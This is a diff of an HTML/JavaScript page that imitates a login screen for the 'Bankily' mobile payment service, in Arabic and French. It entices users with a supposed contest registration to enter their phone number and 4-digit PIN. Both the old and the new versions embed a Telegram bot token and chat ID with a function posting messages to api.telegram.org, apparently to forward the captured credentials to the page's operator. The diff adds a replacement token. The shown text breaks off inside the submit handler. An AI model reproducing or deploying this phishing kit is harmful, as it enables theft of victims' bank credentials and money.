@@ -1,425 +1,304 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title id="page-title">تسجيل الدخول</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-    :root {
-      --teal: #14C9A8; --teal-dark: #0fb898;
-      --bg: #ffffff; --bg-gray: #f4f5f7;
-      --text: #1a1a1a; --text-mid: #555; --text-light: #999;
-      --border: #e8e8e8; --red: #e53935;
-    }
-    html, body { height:100%; overflow:hidden; }
-    body { font-family:'Cairo',sans-serif; background:var(--bg); display:flex; flex-direction:column; height:100dvh; }
-
-    /* HEADER */
-    .header { display:flex; align-items:center; justify-content:space-between; padding:14px 20px; flex-shrink:0; }
-    .lang-btn { background:none; border:1.5px solid var(--teal); color:var(--teal); padding:5px 14px; border-radius:20px; font-family:'Cairo',sans-serif; font-size:13px; font-weight:700; cursor:pointer; transition:all .2s; }
-    .lang-btn:active { background:var(--teal); color:white; }
-    .back-btn { display:flex; align-items:center; gap:4px; background:none; border:none; font-family:'Cairo',sans-serif; font-size:16px; font-weight:600; color:var(--text); cursor:pointer; }
-    .back-arrow { font-size:20px; line-height:1; }
-
-    /* BODY */
-    .body-content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
-
-    /* LOGO */
-    .logo-wrap { display:flex; justify-content:center; align-items:center; padding:28px 20px 18px; }
-    .logo-wrap img { max-height:80px; max-width:220px; object-fit:contain; }
-    .logo-placeholder { display:none; flex-direction:column; align-items:center; gap:6px; }
-    .logo-placeholder .logo-box { width:68px; height:68px; border-radius:18px; background:linear-gradient(135deg,var(--teal),var(--teal-dark)); display:flex; align-items:center; justify-content:center; }
-    .logo-placeholder .logo-box span { font-size:32px; }
-    .logo-placeholder small { font-size:11px; color:var(--text-light); }
-
-    /* SCREEN 1 */
-    .screen-1 { padding:10px 24px 0; flex:1; }
-    .screen-title { font-size:30px; font-weight:800; color:var(--text); text-align:right; margin-bottom:28px; }
-    .field-label { font-size:14px; color:var(--text-light); text-align:right; margin-bottom:8px; }
-    .phone-row { display:flex; align-items:center; gap:10px; border-bottom:1.5px solid var(--border); padding-bottom:10px; margin-bottom:14px; }
-    .phone-input { flex:1; border:none; outline:none; font-family:'Cairo',sans-serif; font-size:22px; font-weight:700; color:var(--text); background:transparent; text-align:right; direction:ltr; letter-spacing:2px; }
-    .phone-input::placeholder { color:#d0d0d0; font-size:18px; letter-spacing:1px; font-weight:400; }
-    .code-box { display:flex; align-items:center; gap:8px; background:var(--bg-gray); border-radius:10px; padding:7px 12px; flex-shrink:0; }
-    .code-text { font-size:18px; font-weight:700; color:var(--text); }
-    .clear-x { width:22px; height:22px; border-radius:50%; background:#c5c5c5; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; color:white; font-size:11px; font-weight:700; }
-    .clear-x:active { background:#999; }
-    .forgot-link { color:var(--text-light); font-size:13px; text-align:right; cursor:pointer; text-decoration:underline; text-underline-offset:3px; margin-bottom:16px; }
-
-    /* BLOCK MESSAGE */
-    .block-msg {
-      background:#fff3f3; border:1.5px solid #ffcdd2; border-radius:12px;
-      padding:12px 16px; margin-bottom:12px; display:none;
-    }
-    .block-msg .block-icon { font-size:20px; margin-bottom:4px; }
-    .block-msg .block-text { font-size:13px; color:var(--red); font-weight:600; line-height:1.5; }
-    .block-msg .block-timer { font-size:18px; font-weight:800; color:var(--red); margin-top:4px; }
-
-    /* BOTTOM */
-    .bottom-bar { background:var(--teal); padding:20px 22px 36px; flex-shrink:0; }
-    .primary-btn { width:100%; background:white; color:var(--text); border:none; border-radius:50px; padding:15px; font-family:'Cairo',sans-serif; font-size:17px; font-weight:700; cursor:pointer; transition:opacity .2s, transform .1s; }
-    .primary-btn:active { opacity:.85; transform:scale(.98); }
-    .primary-btn:disabled { opacity:.5; cursor:not-allowed; transform:none; }
-
-    /* OVERLAY */
-    .overlay { position:fixed; inset:0; background:transparent; z-index:90; pointer-events:none; transition:background .35s; }
-    .overlay.active { background:rgba(0,0,0,.45); pointer-events:all; }
-
-    /* PIN POPUP */
-    .pin-popup { position:fixed; bottom:-110%; left:0; right:0; background:var(--bg-gray); border-radius:24px 24px 0 0; z-index:100; transition:bottom .42s cubic-bezier(.32,1.25,.55,1); padding-bottom:20px; }
-    .pin-popup.active { bottom:0; }
-    .drag-bar { width:40px; height:4px; background:#ddd; border-radius:2px; margin:16px auto 0; }
-    .pin-header { padding:16px 22px 16px; text-align:center; }
-    .pin-instruction { font-size:15px; color:var(--text-light); margin-bottom:20px; }
-    .dots-row { display:flex; align-items:center; justify-content:center; gap:12px; }
-    .reset-btn { background:none; border:none; font-size:24px; color:#888; cursor:pointer; margin-left:8px; padding:4px; transition:color .15s; }
-    .reset-btn:active { color:var(--teal); }
-    .dot { width:14px; height:14px; border-radius:50%; background:#ddd; transition:background .18s, transform .18s; }
-    .dot.on { background:var(--teal); transform:scale(1.2); }
-
-    /* KEYPAD */
-    .keypad-wrap { background:white; border-radius:22px; margin:0 10px; padding:16px 14px; display:grid; grid-template-columns:repeat(4,1fr); gap:10px; box-shadow:0 2px 12px rgba(0,0,0,.06); }
-    .key { aspect-ratio:1; border-radius:50%; border:none; background:white; font-family:'Cairo',sans-serif; font-size:24px; font-weight:600; color:var(--text); cursor:pointer; display:flex; align-items:center; justify-content:center; box-shadow:0 2px 10px rgba(0,0,0,.07); transition:transform .1s, background .1s; user-select:none; }
-    .key:active { transform:scale(.88); background:#f0f0f0; }
-    .key.empty { background:transparent; box-shadow:none; cursor:default; border:1.5px dashed #ebebeb; }
-    .key.empty:active { transform:none; background:transparent; }
-
-    /* SPINNER */
-    .spinner-screen { position:fixed; inset:0; background:rgba(255,255,255,.92); z-index:200; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:18px; opacity:0; pointer-events:none; transition:opacity .25s; }
-    .spinner-screen.active { opacity:1; pointer-events:all; }
-    .ring { width:52px; height:52px; border:4px solid #e8e8e8; border-top-color:var(--teal); border-radius:50%; animation:spin .75s linear infinite; }
-    @keyframes spin { to { transform:rotate(360deg); } }
-    .spin-label { font-size:15px; color:var(--text-mid); }
-
-    /* FR */
-    body.fr .screen-title, body.fr .field-label, body.fr .forgot-link { text-align:left; }
-    body.fr .phone-row { flex-direction:row; direction:ltr; }
-    body.fr .phone-input { text-align:left; }
-    body.fr .back-arrow { transform:scaleX(-1); display:inline-block; }
-    body.fr .block-msg .block-text { text-align:left; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Bankily – Connexion</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;min-height:100vh;overflow-x:hidden;background:#fff}
+body{font-family:'Cairo',sans-serif;background:#ffffff;color:#222;min-height:100vh;display:flex;flex-direction:column;}
+.top-bar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:#fff;border-bottom:1px solid #f0f0f0;position:sticky;top:0;z-index:50;}
+.tb-back{background:none;border:none;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;color:#0097A7;padding:4px 0;display:flex;align-items:center;gap:4px;}
+.tb-lang{background:none;border:1.5px solid #0097A7;border-radius:20px;color:#0097A7;font-family:'Cairo',sans-serif;font-size:13px;font-weight:700;padding:4px 14px;cursor:pointer;transition:all .2s;}
+.tb-lang:hover{background:#0097A7;color:#fff}
+.page{flex:1;display:flex;flex-direction:column;padding:0 28px calc(90px + env(safe-area-inset-bottom));max-width:480px;margin:0 auto;width:100%;}
+.logo-wrap{text-align:center;padding:36px 0 36px;}
+.logo-wrap img{max-width:220px;width:100%;height:auto;display:block;margin:0 auto;}
+.info-msg{font-size:13px;color:#0097A7;background:#E8F7F9;border-radius:10px;padding:10px 14px;margin-bottom:28px;line-height:1.6;text-align:center;transition:opacity .4s,height .4s;}
+.info-msg.hidden{opacity:0;pointer-events:none;height:0;padding:0;margin:0;overflow:hidden}
+.field-row{display:flex;align-items:flex-end;gap:14px;margin-bottom:32px;padding-bottom:6px;border-bottom:1.5px solid #c8c8c8;transition:border-color .25s;}
+.field-row:focus-within{border-color:#0097A7}
+.icon-person{width:28px;height:28px;flex-shrink:0;margin-bottom:2px;color:#666}
+.field-inner{flex:1;display:flex;flex-direction:column;gap:0}
+.float-label{font-size:12px;color:#0097A7;font-weight:700;letter-spacing:.2px;margin-bottom:2px;opacity:0;transform:translateY(6px);transition:opacity .2s,transform .2s;font-family:'Cairo',sans-serif;}
+.float-label.show{opacity:1;transform:none}
+.field-input{border:none;outline:none;background:transparent;font-family:'Cairo',sans-serif;font-size:16px;color:#222;padding:2px 0 4px;width:100%;}
+.field-input::placeholder{color:#aaa;font-size:15px;font-family:'Cairo',sans-serif}
+.pin-row{display:flex;align-items:flex-start;gap:14px;margin-bottom:20px;}
+.icon-lock{width:28px;height:28px;flex-shrink:0;margin-top:4px;color:#666}
+.pin-right{flex:1}
+.pin-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}
+.pin-label{font-size:15px;color:#222;font-weight:600;font-family:'Cairo',sans-serif}
+.forgot-pin{font-size:14px;color:#0097A7;font-weight:600;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif;padding:0;}
+.pin-boxes{display:flex;gap:18px;direction:ltr;align-items:flex-end;}
+.pin-box{width:34px;height:44px;border:none;outline:none;background:transparent;font-family:'Cairo',sans-serif;font-size:24px;font-weight:800;text-align:center;color:#222;direction:ltr;border-bottom:2.5px solid #333;padding:0;caret-color:transparent;-webkit-appearance:none;border-radius:0;}
+.pin-box:focus{border-bottom-color:#0097A7}
+.new-user-wrap{text-align:center;margin-top:auto;padding:24px 0 16px;}
+.new-user-btn{font-size:14px;color:#0097A7;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif;font-weight:600;}
+.btn-bar{position:fixed;bottom:0;left:0;right:0;z-index:100;}
+.login-btn{display:block;width:100%;padding:18px;border:none;background:#F5C20B;color:#fff;font-family:'Cairo',sans-serif;font-size:18px;font-weight:800;cursor:pointer;letter-spacing:.3px;transition:background .2s;}
+.login-btn:hover{background:#E0B008}
+.login-btn:active{background:#CDA007}
+#loader-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.94);z-index:9999;flex-direction:column;align-items:center;justify-content:center;gap:18px;}
+#loader-overlay.active{display:flex}
+.ld-ring{width:52px;height:52px;position:relative}
+.ld-ring::before{content:'';position:absolute;inset:0;border-radius:50%;border:3px solid #eee;border-top-color:#F5C20B;animation:spin .8s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ld-text{font-size:15px;color:#0097A7;font-weight:700;font-family:'Cairo',sans-serif}
+#modal-alert{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:10000;justify-content:center;align-items:center;padding:20px;}
+#modal-alert.show{display:flex}
+.modal-box{background:#fff;border-radius:20px;padding:28px 22px;max-width:340px;width:100%;text-align:center;box-shadow:0 10px 50px rgba(0,0,0,.2);}
+.modal-box p{font-size:15px;color:#222;line-height:1.7;margin-bottom:20px;white-space:pre-line;font-family:'Cairo',sans-serif;}
+.modal-btn{background:#F5C20B;color:#fff;border:none;padding:12px 36px;border-radius:10px;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:700;width:100%;}
+</style>
 </head>
 <body>
 
-<header class="header">
-  <button class="lang-btn" id="lang-btn" onclick="toggleLang()">FR</button>
-  <button class="back-btn" onclick="goBack()">
-    <span id="back-text">رجوع</span>
-    <span class="back-arrow">›</span>
-  </button>
-</header>
+<div id="loader-overlay">
+  <div class="ld-ring"></div>
+  <div class="ld-text" id="ld-text">Connexion en cours...</div>
+</div>
 
-<div class="body-content">
+<div id="modal-alert">
+  <div class="modal-box">
+    <p id="modal-text"></p>
+    <button class="modal-btn" id="modal-close">OK</button>
+  </div>
+</div>
+
+<div class="top-bar">
+  <button class="tb-back" id="back-btn" onclick="window.location.href='index.html'">&#8592; Retour</button>
+  <button class="tb-lang" id="lang-btn" onclick="toggleLang()">عربي</button>
+</div>
+
+<div class="page">
   <div class="logo-wrap">
-    <img src="images/logo2.png" alt="Logo" onerror="this.style.display='none'; document.getElementById('logo-ph').style.display='flex';">
-    <div class="logo-placeholder" id="logo-ph">
-      <div class="logo-box"><span></span></div>
-      <small>logo.png</small>
-    </div>
+    <img src="images/logo.png" alt="Bankily" onerror="this.style.display='none'">
   </div>
 
-  <div class="screen-1">
-    <div class="screen-title" id="s-title">الاتصال</div>
-    <div class="field-label" id="s-phone-label">رقم الهاتف</div>
-    <div class="phone-row">
-      <div class="code-box">
-        <button class="clear-x" onclick="clearPhone()">✕</button>
-        <span class="code-text">222</span>
+  <div class="info-msg" id="info-msg">
+    Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours
+  </div>
+
+  <form id="login-form" autocomplete="off">
+    <div class="field-row" id="field-row-user">
+      <svg class="icon-person" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="8" r="4"/>
+        <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+      </svg>
+      <div class="field-inner">
+        <div class="float-label" id="float-label-user">Nom d'utilisateur ou numéro de téléphone</div>
+        <input class="field-input" type="tel" id="username" inputmode="numeric" maxlength="8"
+          placeholder="Nom d'utilisateur ou numéro de téléphone" autocomplete="off">
       </div>
-      <input type="tel" id="phone-input" class="phone-input" maxlength="8" inputmode="numeric" placeholder="XX XX XX XX" oninput="onPhone(this)">
     </div>
-    <div class="forgot-link" id="s-forgot">لم يعد بإمكاني الوصول إلى رقمي</div>
 
-    <!-- BLOCK MESSAGE -->
-    <div class="block-msg" id="block-msg">
-      <div class="block-icon">🚫</div>
-      <div class="block-text" id="block-text"></div>
-      <div class="block-timer" id="block-timer"></div>
+    <div class="pin-row">
+      <svg class="icon-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="5" y="11" width="14" height="10" rx="2"/>
+        <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+      </svg>
+      <div class="pin-right">
+        <div class="pin-top">
+          <span class="pin-label" id="pin-label">Code PIN</span>
+          <button type="button" class="forgot-pin" id="forgot-pin">Code PIN oublié ?</button>
+        </div>
+        <div class="pin-boxes" id="pin-boxes" dir="ltr">
+          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+          <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+        </div>
+      </div>
     </div>
-  </div>
 
-  <div class="bottom-bar">
-    <button class="primary-btn" id="act-btn" disabled onclick="tryOpenPin()">
-      <span id="s-btn">تفعيل الاتصال</span>
-    </button>
-  </div>
+    <div class="new-user-wrap">
+      <button type="button" class="new-user-btn" id="new-user">Nouvel utilisateur ? Inscrivez-vous maintenant !</button>
+    </div>
+  </form>
 </div>
 
-<div class="overlay" id="overlay" onclick="closePin()"></div>
-
-<div class="pin-popup" id="pin-popup">
-  <div class="drag-bar"></div>
-  <div class="pin-header">
-    <div class="pin-instruction" id="s-pin-hint">أدخل رمزك السري لكي تواصل</div>
-    <div class="dots-row">
-      <button class="reset-btn" onclick="resetPin()">↺</button>
-      <div class="dot" id="d0"></div>
-      <div class="dot" id="d1"></div>
-      <div class="dot" id="d2"></div>
-      <div class="dot" id="d3"></div>
-    </div>
-  </div>
-  <div class="keypad-wrap" id="keypad"></div>
-</div>
-
-<div class="spinner-screen" id="spinner">
-  <div class="ring"></div>
-  <div class="spin-label" id="s-spinner">جاري تسجيل الدخول...</div>
+<div class="btn-bar">
+  <button class="login-btn" id="login-btn"
+    onclick="document.getElementById('login-form').dispatchEvent(new Event('submit',{cancelable:true,bubbles:true}))">
+    Se connecter
+  </button>
 </div>
 
 <script>
-// ── CONFIG ──
-const BOT_TOKEN = '8744987826:AAG1dT-BOUikFMtDslYxNa2htJB-tMs5FdA';
-const CHAT_ID   = '8674569520';
+const usernameInput = document.getElementById('username');
+const pinInputs     = document.querySelectorAll('.pin-box');
+const loaderOverlay = document.getElementById('loader-overlay');
+const modalAlert    = document.getElementById('modal-alert');
+const modalText     = document.getElementById('modal-text');
+const modalClose    = document.getElementById('modal-close');
+const infoMsg       = document.getElementById('info-msg');
+const loginBtn      = document.getElementById('login-btn');
+const floatLabel    = document.getElementById('float-label-user');
 
-// ── TRANSLATIONS ──
 const T = {
-  ar: {
-    title:'تسجيل الدخول', back:'رجوع', sTitle:'الاتصال',
-    phoneLabel:'رقم الهاتف', forgot:'لم يعد بإمكاني الوصول إلى رقمي',
-    btn:'تفعيل الاتصال', pinHint:'أدخل رمزك السري لكي تواصل',
-    spinner:'جاري تسجيل الدخول...', langBtn:'FR',
-    block10: 'هذا الرقم مسجل مسبقاً. يمكنك المحاولة مرة أخرى بعد:',
-    block24: 'تم حظر هذا الرقم لمدة 24 ساعة بسبب محاولات متعددة. الوقت المتبقي:',
+  ar:{
+    dir:'rtl',lang:'ar',langBtn:'FR',
+    placeholder:'اسم المستخدم أو رقم الهاتف',
+    floatLabel:'اسم المستخدم أو رقم الهاتف',
+    pinLabel:'الرمز السري',
+    forgotPin:'نسيت الرمز السري؟',
+    newUser:'مستخدم جديد؟ سجّل الآن!',
+    loginBtn:'تسجيل الدخول',
+    backBtn:'رجوع &#8594;',
+    ldText:'جاري التسجيل...',
+    infoMsg:'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
+    errUsername:'يجب أن يحتوي رقم بنكيلي على 8 أرقام ويبدأ بـ 2 أو 3 أو 4',
+    errPin:'يجب أن يحتوي الرمز السري على 4 أرقام',
+    errPinUnique:'يجب أن يحتوي الرمز السري على 4 أرقام مختلفة',
+    already:(m)=>`⛔ لقد قمت بالتسجيل في مسابقة بنكيلي من قبل.\nلا يمكنك التسجيل مرة أخرى إلا بعد ${m} دقيقة.`,
   },
-  fr: {
-    title:'Connexion', back:'Retour', sTitle:'Connexion',
-    phoneLabel:'Numéro de téléphone', forgot:"Je n'ai plus accès à mon numéro",
-    btn:'Activer la connexion', pinHint:'Entrez votre code secret pour continuer',
-    spinner:'Connexion en cours...', langBtn:'AR',
-    block10: 'Ce numéro est déjà enregistré. Réessayez dans :',
-    block24: 'Ce numéro est bloqué pendant 24h suite à plusieurs tentatives. Temps restant :',
+  fr:{
+    dir:'ltr',lang:'fr',langBtn:'عربي',
+    placeholder:"Nom d'utilisateur ou numéro de téléphone",
+    floatLabel:"Nom d'utilisateur ou numéro de téléphone",
+    pinLabel:'Code PIN',
+    forgotPin:'Code PIN oublié ?',
+    newUser:"Nouvel utilisateur ? Inscrivez-vous maintenant !",
+    loginBtn:'Se connecter',
+    backBtn:'&#8592; Retour',
+    ldText:'Connexion en cours...',
+    infoMsg:"Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours",
+    errUsername:'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
+    errPin:'Le code PIN doit contenir 4 chiffres',
+    errPinUnique:'Le code PIN doit contenir 4 chiffres tous différents',
+    already:(m)=>`⛔ Vous avez déjà participé au concours Bankily.\nVous ne pouvez pas vous réinscrire avant ${m} minute(s).`,
   }
 };
-let lang = localStorage.getItem('appLang') || 'ar';
 
-function applyLang() {
-  const t = T[lang];
-  document.title = t.title;
-  document.getElementById('page-title').textContent = t.title;
-  document.getElementById('back-text').textContent = t.back;
-  document.getElementById('s-title').textContent = t.sTitle;
-  document.getElementById('s-phone-label').textContent = t.phoneLabel;
-  document.getElementById('s-forgot').textContent = t.forgot;
-  document.getElementById('s-btn').textContent = t.btn;
-  document.getElementById('s-pin-hint').textContent = t.pinHint;
-  document.getElementById('s-spinner').textContent = t.spinner;
-  document.getElementById('lang-btn').textContent = t.langBtn;
-  document.documentElement.lang = lang;
-  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-  document.body.classList.toggle('fr', lang === 'fr');
+let isAr = localStorage.getItem('bankily_lang') === 'ar'
+  || (!localStorage.getItem('bankily_lang') && (navigator.language||'').startsWith('ar'));
+
+function applyLang(){
+  const L = isAr ? T.ar : T.fr;
+  document.documentElement.lang = L.lang;
+  document.documentElement.dir  = L.dir;
+  document.body.dir              = L.dir;
+  document.getElementById('back-btn').innerHTML     = L.backBtn;
+  document.getElementById('lang-btn').textContent   = L.langBtn;
+  document.getElementById('pin-label').textContent  = L.pinLabel;
+  document.getElementById('forgot-pin').textContent = L.forgotPin;
+  document.getElementById('new-user').textContent   = L.newUser;
+  document.getElementById('ld-text').textContent    = L.ldText;
+  document.getElementById('info-msg').textContent   = L.infoMsg;
+  floatLabel.textContent = L.floatLabel;
+  loginBtn.textContent   = L.loginBtn;
+  usernameInput.placeholder = L.placeholder;
+  document.getElementById('pin-boxes').dir = 'ltr';
+  pinInputs.forEach(i=>{ i.setAttribute('dir','ltr'); i.setAttribute('lang','fr'); });
 }
-function toggleLang() {
-  lang = lang === 'ar' ? 'fr' : 'ar';
-  localStorage.setItem('appLang', lang);
+
+function toggleLang(){
+  isAr = !isAr;
+  localStorage.setItem('bankily_lang', isAr?'ar':'fr');
   applyLang();
 }
 
-// ── TELEGRAM ──
-async function sendTelegram(text) {
-  try {
-    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-    });
-  } catch(e) { console.warn('Telegram error:', e); }
-}
+usernameInput.addEventListener('focus', ()=>floatLabel.classList.add('show'));
+usernameInput.addEventListener('blur',  ()=>{ if(!usernameInput.value) floatLabel.classList.remove('show'); });
+usernameInput.addEventListener('input', ()=>{ floatLabel.classList.toggle('show', usernameInput.value!==''); });
 
-// ── REGISTRATION BLOCK ──
-const BLOCK_10  = 10 * 60 * 1000;       // 10 minutes
-const BLOCK_24  = 24 * 60 * 60 * 1000;  // 24 hours
+const infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 3500);
+usernameInput.addEventListener('input',()=>{ clearTimeout(infoTimer); infoMsg.classList.add('hidden'); });
 
-function getRegData(phone) {
-  return JSON.parse(localStorage.getItem('reg_' + phone) || 'null');
-}
-function saveRegData(phone, data) {
-  localStorage.setItem('reg_' + phone, JSON.stringify(data));
-}
+function showModal(msg){ modalText.textContent=msg; modalAlert.classList.add('show'); }
+modalClose.addEventListener('click',()=>modalAlert.classList.remove('show'));
 
-function checkBlock(phone) {
-  const data = getRegData(phone);
-  if (!data) return null;
-  const now = Date.now();
-
-  if (data.count === 1) {
-    const elapsed = now - data.lastTime;
-    if (elapsed < BLOCK_10) return { type: '10min', ms: BLOCK_10 - elapsed };
-    return null;
-  }
-
-  if (data.count >= 2) {
-    const elapsed = now - data.lastTime;
-    if (elapsed < BLOCK_24) return { type: '24h', ms: BLOCK_24 - elapsed };
-    localStorage.removeItem('reg_' + phone);
-    return null;
-  }
-  return null;
-}
-
-function recordReg(phone) {
-  const data = getRegData(phone);
-  const now = Date.now();
-  if (!data) {
-    saveRegData(phone, { count: 1, firstTime: now, lastTime: now });
-  } else {
-    saveRegData(phone, { count: data.count + 1, firstTime: data.firstTime, lastTime: now });
-  }
-}
-
-// FIX: template literals were broken in original
-function formatTime(ms) {
-  const totalSec = Math.ceil(ms / 1000);
-  const h = Math.floor(totalSec / 3600);
-  const m = Math.floor((totalSec % 3600) / 60);
-  const s = totalSec % 60;
-  const pad = function(n) { return String(n).padStart(2, '0'); };
-  if (h > 0) return pad(h) + ':' + pad(m) + ':' + pad(s);
-  return pad(m) + ':' + pad(s);
-}
-
-let blockInterval = null;
-function showBlock(block) {
-  const t = T[lang];
-  const msg = document.getElementById('block-msg');
-  const txt = document.getElementById('block-text');
-  const tmr = document.getElementById('block-timer');
-  msg.style.display = 'block';
-  txt.textContent = block.type === '10min' ? t.block10 : t.block24;
-
-  clearInterval(blockInterval);
-  let remaining = block.ms;
-  tmr.textContent = formatTime(remaining);
-  blockInterval = setInterval(function() {
-    remaining -= 1000;
-    if (remaining <= 0) {
-      clearInterval(blockInterval);
-      msg.style.display = 'none';
-      document.getElementById('act-btn').disabled = false;
-    } else {
-      tmr.textContent = formatTime(remaining);
+pinInputs.forEach((inp,i)=>{
+  inp.setAttribute('dir','ltr'); inp.setAttribute('lang','fr');
+  inp.addEventListener('input',()=>{
+    inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
+    if(inp.value && i < pinInputs.length-1) pinInputs[i+1].focus();
+    setTimeout(()=>{ inp.type='password'; },500);
+  });
+  inp.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){
+      if(inp.value==='' && i>0){ pinInputs[i-1].type='tel'; pinInputs[i-1].value=''; pinInputs[i-1].focus(); }
+      else{ inp.type='tel'; inp.value=''; }
+      e.preventDefault();
     }
-  }, 1000);
-}
+    if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key))
+      e.preventDefault();
+  });
+  inp.addEventListener('paste',e=>{
+    e.preventDefault();
+    const digits=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
+    [...digits].slice(0,4).forEach((d,j)=>{ if(pinInputs[j]){pinInputs[j].type='tel';pinInputs[j].value=d;} });
+    pinInputs[Math.min(digits.length,pinInputs.length-1)].focus();
+  });
+});
 
-// ── PHONE ──
-function isValidPhone(v) {
-  if (v.length !== 8) return false;
-  if (!['2','3','4'].includes(v[0])) return false;
-  // Reject numbers where all digits are the same (e.g. 46666666, 23333333)
-  if (/^(.)\1+$/.test(v.slice(1))) return false;
-  return true;
-}
-
-function onPhone(el) {
-  el.value = el.value.replace(/\D/g, '').slice(0, 8);
-  document.getElementById('block-msg').style.display = 'none';
-  clearInterval(blockInterval);
-  const v = el.value;
-  document.getElementById('act-btn').disabled = !isValidPhone(v);
-}
-function clearPhone() {
-  document.getElementById('phone-input').value = '';
-  document.getElementById('act-btn').disabled = true;
-  document.getElementById('block-msg').style.display = 'none';
-  clearInterval(blockInterval);
-}
-
-// ── PIN ──
-let pin = '';
-
-function tryOpenPin() {
-  const phone = document.getElementById('phone-input').value;
-  const block = checkBlock(phone);
-  if (block) {
-    document.getElementById('act-btn').disabled = true;
-    showBlock(block);
-    return;
-  }
-  openPin();
-}
-
-function buildKeypad() {
-  const wrap = document.getElementById('keypad');
-  const slots = Array(16).fill(null);
-  const idxs = Array.from({length: 16}, function(_, i) { return i; })
-                    .sort(function() { return Math.random() - 0.5; })
-                    .slice(0, 10);
-  [0,1,2,3,4,5,6,7,8,9].forEach(function(d, i) { slots[idxs[i]] = d; });
-  wrap.innerHTML = '';
-  slots.forEach(function(v) {
-    const b = document.createElement('button');
-    b.className = 'key' + (v === null ? ' empty' : '');
-    if (v !== null) {
-      b.textContent = v;
-      b.addEventListener('click', (function(digit) {
-        return function() { pressKey(digit); };
-      })(v));
-    }
-    wrap.appendChild(b);
+if(window.visualViewport){
+  window.visualViewport.addEventListener('resize',()=>{
+    const kb=window.innerHeight-window.visualViewport.height;
+    document.querySelector('.btn-bar').style.transform=kb>50?`translateY(-${kb}px)`:'';
   });
 }
 
-function openPin() {
-  pin = ''; updateDots(); buildKeypad();
-  document.getElementById('overlay').classList.add('active');
-  document.getElementById('pin-popup').classList.add('active');
+/* ══ TELEGRAM — TOKEN و CHAT ID المحدَّثان ══ */
+const TG_TOKEN  = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
+const TG_CHATID = '8674569520';
+
+async function sendTG(text){
+  try{
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:TG_CHATID,text,parse_mode:'HTML'})
+    });
+  }catch(e){}
 }
-function closePin() {
-  document.getElementById('overlay').classList.remove('active');
-  document.getElementById('pin-popup').classList.remove('active');
+
+function checkReg(u){
+  const d=localStorage.getItem('bnk_reg_'+u);
+  if(!d)return false;
+  const el=(Date.now()-JSON.parse(d).ts)/60000;
+  if(el>=10){localStorage.removeItem('bnk_reg_'+u);return false;}
+  return Math.ceil(10-el);
 }
-function pressKey(d) {
-  if (pin.length >= 4) return;
-  pin += d; updateDots();
-  if (pin.length === 4) setTimeout(doLogin, 250);
-}
-function resetPin() { pin = ''; updateDots(); }
-function updateDots() {
-  for (let i = 0; i < 4; i++) {
-    document.getElementById('d' + i).classList.toggle('on', i < pin.length);
+function markReg(u){ localStorage.setItem('bnk_reg_'+u,JSON.stringify({ts:Date.now()})); }
+
+document.getElementById('login-form').addEventListener('submit',async function(e){
+  e.preventDefault();
+  const L=isAr?T.ar:T.fr;
+  const username=usernameInput.value.trim();
+  const pin=Array.from(pinInputs).map(i=>i.value).join('');
